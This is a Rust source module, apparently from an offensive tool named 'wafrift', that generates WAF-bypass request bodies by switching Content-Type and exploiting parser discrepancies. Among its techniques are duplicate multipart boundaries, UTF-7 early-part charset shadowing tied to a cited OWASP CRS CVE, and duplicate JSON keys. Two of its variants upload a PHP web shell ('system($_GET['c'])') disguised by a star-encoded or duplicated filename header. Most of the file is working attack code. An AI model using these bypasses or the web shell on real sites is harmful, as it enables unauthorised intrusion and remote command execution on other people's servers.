//! Content-Type switching — WAFFLED parsing discrepancy exploitation.
//!
//! The core insight from WAFFLED research: WAFs parse request bodies based on
//! Content-Type, but many web servers accept multiple formats interchangeably.
//! Send a payload in a format the WAF doesn't inspect deeply.
//!
//! 90% of real websites accept both form-encoded and multipart interchangeably.
//! This means Content-Type switching works on nearly every target.
//!
//! Reference: "WAFFLED: Exploiting Parsing Discrepancies to Bypass WAFs"
//!            Akhavani et al., IEEE S&P 2025

use rand::Rng;
use std::fmt::Write as _;

/// Errors produced by content-type parsing and variant generation.
#[derive(Debug, thiserror::Error, Clone, PartialEq, Eq)]
pub enum ContentTypeError {
    /// The input body exceeded the maximum allowed size for form parsing.
    #[error("form body too large: {got} bytes exceeds cap of {cap} bytes")]
    BodyTooLarge { got: usize, cap: usize },
}

/// A Content-Type variant with the transformed body.
#[derive(Debug, Clone)]
pub struct ContentTypeVariant {
    /// The Content-Type header value to send.
    pub content_type: String,
    /// The transformed request body.
    pub body: Vec<u8>,
    /// Which technique this uses.
    pub technique: ContentTypeTechnique,
    /// Human-readable description.
    pub description: String,
}

/// Content-Type switching techniques.
#[derive(Debug, Clone, PartialEq)]
pub enum ContentTypeTechnique {
    /// Standard multipart/form-data (valid, but WAF may not inspect body deeply).
    Multipart,
    /// Multipart with quoted boundary (valid per RFC, breaks many WAF parsers).
    MultipartQuotedBoundary,
    /// Multipart with whitespace in boundary (confuses parsers).
    MultipartWhitespaceBoundary,
    /// Multipart with duplicate boundary parameter (first vs last wins).
    MultipartDuplicateBoundary,
    /// Multipart with charset parameter before boundary (parser confusion).
    MultipartCharsetPrefix,
    /// JSON body with unicode-escaped keys and values.
    JsonUnicodeEscape,
    /// JSON body with comments (non-standard but some parsers accept).
    JsonWithComments,
    /// XML body with namespace prefix on payload element.
    XmlNamespace,
    /// XML body with CDATA section wrapping payload.
    XmlCdata,
    /// Mixed Content-Type header (multipart but with JSON charset).
    MixedContentType,
    /// CVE-2026-21876 — multipart with `charset=` on an EARLY part
    /// (e.g. utf-7) and benign charset on the last part. OWASP CRS
    /// 922110 iterates all `MULTIPART_PART_HEADERS`, captures each
    /// part's charset to TX:1, overwrites on every iteration. The
    /// chained validation sees only the LAST part's charset. Payload
    /// (e.g. `+ADw-script+AD4-`) lives in the early part with the
    /// exotic charset. Fixed in CRS 4.22.0 / 3.3.8.
    MultipartCharsetEarlySection,
    /// JSON with duplicate keys — `{"id":"safe","id":"' OR 1=1--"}`.
    /// AWS WAF and most WAFs take FIRST (`safe`); Python json /
    /// Node JSON.parse / Go encoding-json take LAST (the injection).
    /// Confirmed bypass per WafCharm 2024 docs.
    JsonDuplicateKey,
    /// Multipart with `filename*=UTF-8''shell%2Ephp` (RFC 5987
    /// percent-encoded). WAF inspects `filename=` and misses the
    /// star-form; Busboy, Werkzeug, Django all decode `filename*` and
    /// see the original `shell.php`. Sicuranext 2025.
    MultipartFilenameStarEncoded,
    /// Two `Content-Disposition` lines in the SAME multipart part —
    /// first has `filename="evil.php"`, second has `filename="safe.txt"`.
    /// WAF reads the second; PHP `$_FILES` reads the first. Sicuranext
    /// 2025 confirmed against FortiWeb + PHP.
    MultipartDuplicatePartHeader,
}

/// Maximum size of a form-encoded body before parsing is refused.
///
/// Prevents `DoS` via adversarial multi-gigabyte inputs that would be
/// fully allocated as strings during `split('&')` and `to_string()`.
const MAX_FORM_BODY_SIZE: usize = 8 * 1024 * 1024;

/// Aggregate key+value budget (bytes) that [`generate_variants`] will
/// re-serialise.
///
/// `generate_variants` emits ~12 reformattings, **each containing every
/// param**, so its output is `≈ Σ(key+value) × variant_count`. With
/// only the 8 MiB `parse_form_body` guard, an 8 MiB body amplifies to
/// ~100 MB per call — and the proxy calls this once per intercepted
/// request, so a handful of concurrent large bodies OOMs the process.
/// The WAF-parser-discrepancy signal does not grow with body size: a
/// few KB of params already exercises every divergent parser. Cap the
/// expandable input so output is bounded regardless of how large (or
/// how adversarially padded) the request body is.
const MAX_VARIANT_INPUT_BYTES: usize = 64 * 1024;

/// Per-value cap so a single giant value can't blow the whole budget
/// (and starve the parser-divergence coverage that needs *multiple*
/// params, not one huge one).
const MAX_VARIANT_VALUE_BYTES: usize = 8 * 1024;

/// Truncate a parameter list down to [`MAX_VARIANT_INPUT_BYTES`] of
/// aggregate key+value bytes, snapping every truncation to a UTF-8
/// char boundary (these strings flow straight into XML/JSON/multipart
/// serialisers that must stay valid). Returns the original slice
/// untouched in the common small-body case (no allocation).
fn bound_params(params: &[(String, String)]) -> std::borrow::Cow<'_, [(String, String)]> {
    let total: usize = params.iter().map(|(k, v)| k.len() + v.len()).sum();
    let oversize_value = params
        .iter()
        .any(|(_, v)| v.len() > MAX_VARIANT_VALUE_BYTES);
    if total <= MAX_VARIANT_INPUT_BYTES && !oversize_value {
        return std::borrow::Cow::Borrowed(params);
    }
    fn floor_char_boundary(s: &str, mut idx: usize) -> usize {
        idx = idx.min(s.len());
        while idx > 0 && !s.is_char_boundary(idx) {
            idx -= 1;
        }
        idx
    }
    let mut out: Vec<(String, String)> = Vec::new();
    let mut used = 0usize;
    for (k, v) in params {
        if used >= MAX_VARIANT_INPUT_BYTES {
            break;
        }
        let k = k[..floor_char_boundary(k, MAX_VARIANT_VALUE_BYTES)].to_string();
        let v = v[..floor_char_boundary(v, MAX_VARIANT_VALUE_BYTES)].to_string();
        let remaining = MAX_VARIANT_INPUT_BYTES - used;
        let cost = k.len() + v.len();
        if cost > remaining {
            // Trim the value to fit the remaining budget exactly.
            let vb = floor_char_boundary(&v, remaining.saturating_sub(k.len()));
            out.push((k.clone(), v[..vb].to_string()));
            break;
        }
        used += cost;
        out.push((k, v));
    }
    std::borrow::Cow::Owned(out)
}

/// Parse form-encoded body into key-value pairs.
///
/// Only segments containing `=` are considered valid key-value pairs.
/// Plain text without `=` delimiters is skipped.
///
/// **UTF-8 handling.** Invalid UTF-8 bytes are rejected — the function
/// returns an empty `Vec` rather than partial pairs. (Audit
/// 2026-05-10: a previous version of this docstring claimed "returns
/// the pairs successfully parsed before the failure" which was a lie
/// — the actual code aborts the whole parse on the first non-UTF-8
/// byte. The lie was caught reading code-vs-docs in batch 6 of the
/// credibility audit.)
///
/// **Size guarding.** Bodies larger than `MAX_FORM_BODY_SIZE` (8 MiB) are
/// rejected with [`ContentTypeError::BodyTooLarge`] to prevent memory
/// exhaustion on adversarial inputs. Use [`parse_form_body_lossy`] if
/// you need the old empty-Vec-on-oversize behaviour.
///
/// # Errors
///
/// Returns [`ContentTypeError::BodyTooLarge`] when `body.len() > MAX_FORM_BODY_SIZE`.
pub fn parse_form_body(body: &[u8]) -> Result<Vec<(String, String)>, ContentTypeError> {
    if body.len() > MAX_FORM_BODY_SIZE {
        return Err(ContentTypeError::BodyTooLarge {
            got: body.len(),
            cap: MAX_FORM_BODY_SIZE,
        });
    }
    let Ok(body_str) = std::str::from_utf8(body) else {
        return Ok(Vec::new());
    };
    Ok(body_str
        .split('&')
        .filter_map(|pair| {
            let mut parts = pair.splitn(2, '=');
            let key = parts.next()?.to_string();
            // Only include pairs that actually have an '=' delimiter
            let value = parts.next()?.to_string();
            if key.is_empty() {
                None
            } else {
                Some((key, value))
            }
        })
        .collect())
}

/// Backwards-compatible wrapper around [`parse_form_body`] that returns an
/// empty `Vec` on any error (including oversized bodies) instead of `Result`.
///
/// Prefer [`parse_form_body`] for new code so oversized inputs are
/// handled explicitly.
#[deprecated(
    since = "0.2.22",
    note = "Use `parse_form_body` which returns `Result` and surfaces `BodyTooLarge` explicitly"
)]
#[must_use]
pub fn parse_form_body_lossy(body: &[u8]) -> Vec<(String, String)> {
    parse_form_body(body).unwrap_or_default()
}

/// Generate a random boundary string.
fn random_boundary() -> String {
    let mut rng = rand::thread_rng();
    let mut hex = String::with_capacity(32);

    for _ in 0..16 {
        let _ = write!(&mut hex, "{:02x}", rng.r#gen::<u8>());
    }
    format!("----WafriftBoundary{hex}")
}

/// Generate a boundary guaranteed not to appear in any of the supplied
/// values (collision-free framing). Falls back to plain `random_boundary`
/// once a fresh value clears the inputs — the 128-bit hex tail makes
/// this loop terminate on the first attempt with overwhelming probability,
/// but checking explicitly costs nothing and prevents the once-in-the-
/// universe case where a payload happens to embed our boundary.
#[must_use]
pub fn unique_boundary(values: &[&str]) -> String {
    // Bounded retry: if the entropy source wedges, give up and ship the
    // last candidate rather than spin forever. 16 attempts is already
    // 16 * 128 = 2048 bits of separation from any plausible adversarial
    // collision attempt.
    let mut candidate = random_boundary();
    for _ in 0..16 {
        let needle = format!("--{candidate}");
        if !values.iter().any(|v| v.contains(&needle)) {
            return candidate;
        }
        candidate = random_boundary();
    }
    candidate
}

fn cdata_escape(value: &str) -> String {
    // Properly split `]]>` across CDATA boundaries to prevent early termination
    // without silently deleting payload characters.
    value.replace("]]>", "]]]]><![CDATA[>")
}

/// Escape a string for XML text content (outside CDATA).
fn xml_escape(value: &str) -> String {
    value
        .replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&apos;")
}

/// `NameStartChar` per XML 1.0 (5th ed.) §2.3.
///
/// NOT the same as Rust's `char::is_alphabetic`: that follows the
/// Unicode `Alphabetic` derived property, which XML does not. The
/// previous implementation used `is_alphabetic`/`is_alphanumeric`,
/// which **accepts characters XML forbids in a Name** — e.g. `²`
/// (U+00B2, category `No`) is `is_alphanumeric() == true` but is not a
/// `NameChar`, so `xml_safe_name("0²")` returned `"_²"`, an invalid
/// element name that makes the generated XML malformed and the
/// Content-Type/XML evasion variant silently useless.
fn is_xml_name_start(c: char) -> bool {
    c == ':'
        || c == '_'
        || c.is_ascii_alphabetic()
        || ('\u{C0}'..='\u{D6}').contains(&c)
        || ('\u{D8}'..='\u{F6}').contains(&c)
        || ('\u{F8}'..='\u{2FF}').contains(&c)
        || ('\u{370}'..='\u{37D}').contains(&c)
        || ('\u{37F}'..='\u{1FFF}').contains(&c)
        || ('\u{200C}'..='\u{200D}').contains(&c)
        || ('\u{2070}'..='\u{218F}').contains(&c)
        || ('\u{2C00}'..='\u{2FEF}').contains(&c)
        || ('\u{3001}'..='\u{D7FF}').contains(&c)
        || ('\u{F900}'..='\u{FDCF}').contains(&c)
        || ('\u{FDF0}'..='\u{FFFD}').contains(&c)
        || ('\u{10000}'..='\u{EFFFF}').contains(&c)
}

/// `NameChar` per XML 1.0 (5th ed.) §2.3 = `NameStartChar` plus a
/// closed set of continuation characters.
fn is_xml_name_char(c: char) -> bool {
    is_xml_name_start(c)
        || c == '-'
        || c == '.'
        || c.is_ascii_digit()
        || c == '\u{B7}'
        || ('\u{0300}'..='\u{036F}').contains(&c)
        || ('\u{203F}'..='\u{2040}').contains(&c)
}

/// Sanitise an arbitrary string into a syntactically valid XML 1.0
/// element/attribute Name.
///
/// Contract (exercised by `tests/panic_safety_audit.rs` against the XML
/// grammar for *any* input): the result is non-empty, its first char is
/// a `NameStartChar`, every other char is a `NameChar`, and it does not
/// start with the reserved `xml` prefix (XML §2.3: names beginning
/// "xml" in any case are reserved). Valid Unicode names like `日本語`
/// pass through unchanged; invalid characters become `_`.
#[must_use]
pub fn xml_safe_name(name: &str) -> String {
    let mut result = String::with_capacity(name.len() + 1);
    for (i, ch) in name.chars().enumerate() {
        if i == 0 {
            result.push(if is_xml_name_start(ch) { ch } else { '_' });
        } else {
            result.push(if is_xml_name_char(ch) { ch } else { '_' });
        }
    }
    if result.is_empty() {
        result.push('_');
    }
    // The literal sequence "xml" (any case) is a reserved prefix; a
    // strict parser rejects it. Shift it out of the reserved space.
    let lower: String = result.chars().take(3).collect::<String>().to_lowercase();
    if lower == "xml" {
        result.insert(0, '_');
    }
    result
}

/// Build a standard multipart body from params using the given boundary.
/// Keys and values are sanitised to prevent framing breakage:
/// - Quotes in `name=` are backslash-escaped per RFC 7578 §4.2.
/// - CR/LF in keys or values are stripped (they would otherwise close
///   the part header section and let an attacker inject a fake part).
fn build_multipart_body(params: &[(String, String)], boundary: &str) -> Vec<u8> {
    fn safe_name(s: &str) -> String {
        s.replace(['\r', '\n'], "")
            .replace('\\', "\\\\")
            .replace('"', "\\\"")
    }
    fn safe_value(s: &str) -> String {
        s.replace(['\r', '\n'], "")
    }
    let mut body = String::new();
    for (key, value) in params {
        let k = safe_name(key);
        let v = safe_value(value);
        let _ = write!(
            &mut body,
            "--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n"
        );
    }

    let _ = write!(&mut body, "--{boundary}--\r\n");
    body.into_bytes()
}

/// Generate all Content-Type variants for a form-encoded request.
///
/// Each variant reformats the SAME data in a different Content-Type
/// that the server will accept but the WAF may not inspect correctly.
#[allow(clippy::too_many_lines)]
#[must_use]
pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant> {
    // Bound the expandable input first: every variant below re-emits
    // the full param set, so unbounded input here is a memory-
    // amplification DoS (see `MAX_VARIANT_INPUT_BYTES`).
    let bounded = bound_params(params);
    let params: &[(String, String)] = bounded.as_ref();

    let mut variants = Vec::new();
    // Pre-fix every variant called random_boundary() and never checked
    // for collisions with the param values. If a param value happened to
    // contain `--<boundary>` (extremely unlikely with 128-bit hex but
    // not impossible — and *guaranteed* possible if an attacker knows
    // the format and crafts the request body), the multipart body would
    // self-frame and let arbitrary content escape the form parser. We
    // collect the param value strings once and use unique_boundary —
    // which already exists, was tested, and was never wired up.
    let value_refs: Vec<&str> = params.iter().map(|(_, v)| v.as_str()).collect();

    // 1. Standard multipart/form-data
    {
        let boundary = unique_boundary(&value_refs);
        let body = build_multipart_body(params, &boundary);
        variants.push(ContentTypeVariant {
            content_type: format!("multipart/form-data; boundary={boundary}"),
            body,
            technique: ContentTypeTechnique::Multipart,
            description: "Standard multipart — WAF may not inspect body as deeply as form-encoded"
                .into(),
        });
    }

    // 2. Multipart with QUOTED boundary (RFC 2046 allows this, many WAFs don't parse it)
    {
        let boundary = unique_boundary(&value_refs);
        let body = build_multipart_body(params, &boundary);
        variants.push(ContentTypeVariant {
            content_type: format!("multipart/form-data; boundary=\"{boundary}\""),
            body,
            technique: ContentTypeTechnique::MultipartQuotedBoundary,
            description:
                "Quoted boundary — valid per RFC 2046 but breaks many WAF multipart parsers".into(),
        });
    }

    // 3. Multipart with whitespace around boundary value
    {
        let boundary = unique_boundary(&value_refs);
        let body = build_multipart_body(params, &boundary);
        variants.push(ContentTypeVariant {
            content_type: format!("multipart/form-data; boundary= {boundary} "),
            body,
            technique: ContentTypeTechnique::MultipartWhitespaceBoundary,
            description: "Whitespace around boundary — servers trim it, WAFs may not".into(),
        });
    }

    // 4. Multipart with charset BEFORE boundary (parameter order confusion)
    {
        let boundary = unique_boundary(&value_refs);
        let body = build_multipart_body(params, &boundary);
        variants.push(ContentTypeVariant {
            content_type: format!("multipart/form-data; charset=utf-8; boundary={boundary}"),
            body,
            technique: ContentTypeTechnique::MultipartCharsetPrefix,
            description: "Charset before boundary — some WAFs take first param as boundary".into(),
        });
    }

    // 5. Multipart with DUPLICATE boundary parameter (first vs last wins)
    {
        let real_boundary = unique_boundary(&value_refs);
        // Loop until fake_boundary differs from real_boundary. unique_boundary
        // generates 128-bit hex tails so this terminates on the first attempt
        // with overwhelming probability — the loop is a correctness guard, not
        // a performance concern.
        let fake_boundary = loop {
            let candidate = unique_boundary(&value_refs);
            if candidate != real_boundary {
                break candidate;
            }
        };
        let body = build_multipart_body(params, &real_boundary);
        variants.push(ContentTypeVariant {
            content_type: format!(
                "multipart/form-data; boundary={fake_boundary}; boundary={real_boundary}"
            ),
            body,
            technique: ContentTypeTechnique::MultipartDuplicateBoundary,
            description: "Duplicate boundary — WAF uses first (fake), server uses last (real)"
                .into(),
        });
    }

    // 6. JSON with unicode-escaped payload
    {
        let mut json_string = String::new();
        json_string.push('{');
        for (i, (key, value)) in params.iter().enumerate() {
            if i > 0 {
                json_string.push(',');
            }
            let key_escaped = serde_json::to_string(key).unwrap_or_else(|_| format!("\"{key}\""));
            let _ = write!(&mut json_string, "{key_escaped}:\"");
            for c in value.chars() {
                if c.is_ascii_alphanumeric() || c == ' ' {
                    json_string.push(c);
                } else {
                    // Emit \uXXXX escapes directly. For BMP chars (≤ U+FFFF)
                    // a single 4-hex escape is valid JSON. For supplementary-
                    // plane chars (U+10000..U+10FFFF) JSON requires a UTF-16
                    // surrogate pair; without it the output parses as
                    // invalid JSON in strict parsers (and the variant ships
                    // with `Content-Type: application/json` so it must be
                    // valid JSON by contract).
                    let cp = c as u32;
                    if cp <= 0xFFFF {
                        let _ = write!(&mut json_string, "\\u{cp:04x}");
                    } else {
                        // RFC 8259 §7: encode as a UTF-16 surrogate pair.
                        let v = cp - 0x10000;
                        let high = 0xD800 + (v >> 10);
                        let low = 0xDC00 + (v & 0x3FF);
                        let _ = write!(&mut json_string, "\\u{high:04x}\\u{low:04x}");
                    }
                }
            }
            json_string.push('"');
        }
        json_string.push('}');

        variants.push(ContentTypeVariant {
            content_type: "application/json".into(),
            body: json_string.into_bytes(),
            technique: ContentTypeTechnique::JsonUnicodeEscape,
            description: "JSON with unicode escapes — WAF keyword rules miss escaped chars".into(),
        });
    }

    // 7. JSON with comments (non-standard but accepted by many parsers)
    {
        let mut json_obj = serde_json::Map::new();
        for (key, value) in params {
            json_obj.insert(key.clone(), serde_json::Value::String(value.clone()));
        }
        if let Ok(body_json) = serde_json::to_string_pretty(&json_obj) {
            // Insert line comments before each key — many JSON parsers
            // (Jackson, nlohmann, Python json5) accept `//` comments, but
            // WAF JSON parsers typically do not and choke or skip the body.
            let mut body = String::new();
            for line in body_json.lines() {
                if line.trim_start().starts_with('"') {
                    body.push_str("// wafrift padding\n");
                }
                body.push_str(line);
                body.push('\n');
            }
            variants.push(ContentTypeVariant {
                content_type: "application/json".into(),
                body: body.into_bytes(),
                technique: ContentTypeTechnique::JsonWithComments,
                description:
                    "JSON with comments — WAF JSON parser fails, server parser tolerates comments"
                        .into(),
            });
        }
    }

    // 8. XML with CDATA wrapping (CDATA-injection safe)
    {
        let mut xml = String::from("<?xml version=\"1.0\"?>\n<request>\n");
        for (key, value) in params {
            let safe_name = xml_safe_name(key);

            let _ = writeln!(
                &mut xml,
                "  <{}><![CDATA[{}]]></{}>",
                safe_name,
                cdata_escape(value),
                safe_name
            );
        }
        xml.push_str("</request>");
        variants.push(ContentTypeVariant {
            content_type: "application/xml".into(),
            body: xml.into_bytes(),
            technique: ContentTypeTechnique::XmlCdata,
            description:
                "XML with CDATA — payload inside CDATA section invisible to many WAF XML parsers"
                    .into(),
        });
    }

    // 9. XML with namespace prefix
    {
        let mut xml = String::from(
            "<?xml version=\"1.0\"?>\n<ns:request xmlns:ns=\"http://example.com/ns\">\n",
        );
        for (key, value) in params {
            let safe_name = xml_safe_name(key);
            let escaped = xml_escape(value);

            let _ = writeln!(&mut xml, "  <ns:{safe_name}>{escaped}</ns:{safe_name}>");
        }
        xml.push_str("</ns:request>");
        variants.push(ContentTypeVariant {
            content_type: "application/xml".into(),
            body: xml.into_bytes(),
            technique: ContentTypeTechnique::XmlNamespace,
            description: "XML with namespace — WAFs often skip namespaced elements".into(),
        });
    }

    // 10. Mixed Content-Type (multipart body with JSON-style header)
    {
        let boundary = unique_boundary(&value_refs);
        let body = build_multipart_body(params, &boundary);
        variants.push(ContentTypeVariant {
            content_type: format!(
                "multipart/form-data; charset=application/json; boundary={boundary}"
            ),
            body,
            technique: ContentTypeTechnique::MixedContentType,
            description:
                "Mixed Content-Type — confuses WAF parser selection with contradictory signals"
                    .into(),
        });
    }

    // 11. CVE-2026-21876 — early-part charset shadowing.
    //
    // OWASP CRS 922110 iterates MULTIPART_PART_HEADERS, captures
    // each part's charset to TX:1, OVERWRITES on every iteration.
    // The chained validation rule fires once after the loop —
    // seeing only the LAST part's charset. Place the dangerous
    // charset (utf-7) on part[0] (which actually carries the payload)
    // and utf-8 on the trailing dummy part. CRS sees utf-8 on TX:1
    // at validation time, skips. Backend (PHP, Python, Node) honors
    // each part's own charset independently.
    {
        let boundary = unique_boundary(&value_refs);
        let mut body: Vec<u8> = Vec::new();
        // Part 0 with utf-7 charset carrying the payload params.
        for (k, v) in params {
            body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
            body.extend_from_slice(
                format!("Content-Disposition: form-data; name=\"{k}\"\r\n").as_bytes(),
            );
            body.extend_from_slice(b"Content-Type: text/plain; charset=utf-7\r\n\r\n");
            body.extend_from_slice(v.as_bytes());
            body.extend_from_slice(b"\r\n");
        }
        // Trailing dummy part with utf-8 charset (the one CRS sees).
        body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
        body.extend_from_slice(b"Content-Disposition: form-data; name=\"_pad\"\r\n");
        body.extend_from_slice(b"Content-Type: text/plain; charset=utf-8\r\n\r\n");
        body.extend_from_slice(b"x\r\n");
        body.extend_from_slice(format!("--{boundary}--\r\n").as_bytes());
        variants.push(ContentTypeVariant {
            content_type: format!("multipart/form-data; boundary={boundary}"),
            body,
            technique: ContentTypeTechnique::MultipartCharsetEarlySection,
            description:
                "CVE-2026-21876 — early part charset (utf-7) carrying payload, benign utf-8 trailing dummy".into(),
        });
    }

    // 12. JSON duplicate-key WAF/origin split.
    //
    // AWS WAF + most WAFs take FIRST; Python json / Node JSON.parse /
    // Go encoding-json take LAST. Two entries with the same key, first
    // benign, second the injection. We can only emit this if the params
    // are non-empty.
    if !params.is_empty() {
        let (k, v) = &params[0];
        // Construct hand-rolled JSON so the duplicate key survives —
        // serde_json::to_string collapses duplicates.
        let body = format!(
            "{{\"{k}\":\"safe\",\"{k}\":{value}}}",
            value = serde_json::to_string(v).unwrap_or_else(|_| format!("\"{v}\""))
        )
        .into_bytes();
        variants.push(ContentTypeVariant {
            content_type: "application/json".into(),
            body,
            technique: ContentTypeTechnique::JsonDuplicateKey,
            description:
                "Duplicate JSON key — WAF takes first (safe), backend takes last (injection)".into(),
        });
    }

    // 13. Multipart filename* RFC 5987 percent-encoded.
    //
    // WAF inspects `filename=` literal; Busboy / Werkzeug / Django
    // decode `filename*=UTF-8''shell%2Ephp` and see the real name.
    // The upload part precedes the standard form fields so that the
    // form-data structure is otherwise normal.
    {
        let boundary = unique_boundary(&value_refs);
        let mut body: Vec<u8> = Vec::new();
        // First: the malicious upload part with star-encoded filename.
        body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
        body.extend_from_slice(
            b"Content-Disposition: form-data; name=\"upload\"; filename*=UTF-8''shell%2Ephp\r\n",
        );
        body.extend_from_slice(b"Content-Type: application/octet-stream\r\n\r\n");
        body.extend_from_slice(b"<?php system($_GET['c']); ?>\r\n");
        // Then: the standard form params so the multipart structure
        // contains the input fields the bench harness checks for.
        for (k, v) in params {
            body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
            body.extend_from_slice(
                format!("Content-Disposition: form-data; name=\"{k}\"\r\n\r\n").as_bytes(),
            );
            body.extend_from_slice(v.as_bytes());
            body.extend_from_slice(b"\r\n");
        }
        body.extend_from_slice(format!("--{boundary}--\r\n").as_bytes());
        variants.push(ContentTypeVariant {
            content_type: format!("multipart/form-data; boundary={boundary}"),
            body,
            technique: ContentTypeTechnique::MultipartFilenameStarEncoded,
            description:
                "RFC 5987 filename* with percent-encoded dot — WAF inspects filename= only".into(),
        });
    }

    // 14. Duplicate Content-Disposition headers in the SAME part.
    //
    // WAF reads the second header; PHP $_FILES reads the first.
    // First says `filename="evil.php"` (the real file), second says
    // `filename="safe.txt"` (the cover the WAF sees). Standard form
    // params follow so the multipart's form-data fields are present.
    {
        let boundary = unique_boundary(&value_refs);
        let mut body: Vec<u8> = Vec::new();
        body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
        body.extend_from_slice(
            b"Content-Disposition: form-data; name=\"upload\"; filename=\"evil.php\"\r\n",
        );
        body.extend_from_slice(
            b"Content-Disposition: form-data; name=\"upload\"; filename=\"safe.txt\"\r\n",
        );
        body.extend_from_slice(b"Content-Type: application/octet-stream\r\n\r\n");
        body.extend_from_slice(b"<?php system($_GET['c']); ?>\r\n");
        for (k, v) in params {
            body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
            body.extend_from_slice(
                format!("Content-Disposition: form-data; name=\"{k}\"\r\n\r\n").as_bytes(),
            );
            body.extend_from_slice(v.as_bytes());
            body.extend_from_slice(b"\r\n");
        }
        body.extend_from_slice(format!("--{boundary}--\r\n").as_bytes());
        variants.push(ContentTypeVariant {
            content_type: format!("multipart/form-data; boundary={boundary}"),
            body,
            technique: ContentTypeTechnique::MultipartDuplicatePartHeader,
            description:
                "Duplicate Content-Disposition — first wins (PHP $_FILES), WAF reads second".into(),
        });
    }

    variants
}

/// Generate Content-Type variants from a raw form-encoded body.
///
/// Returns an empty `Vec` if the body is not valid form-encoded data,
/// is too large, or contains no parseable key-value pairs.
#[must_use]
pub fn generate_variants_from_body(body: &[u8]) -> Vec<ContentTypeVariant> {
    let params = match parse_form_body(body) {
        Ok(p) => p,
        Err(_) => return Vec::new(),
    };
    if params.is_empty() {
        return Vec::new();
    }
    generate_variants(&params)
}

#[cfg(test)]
#[path = "content_type_tests.rs"]
mod tests;
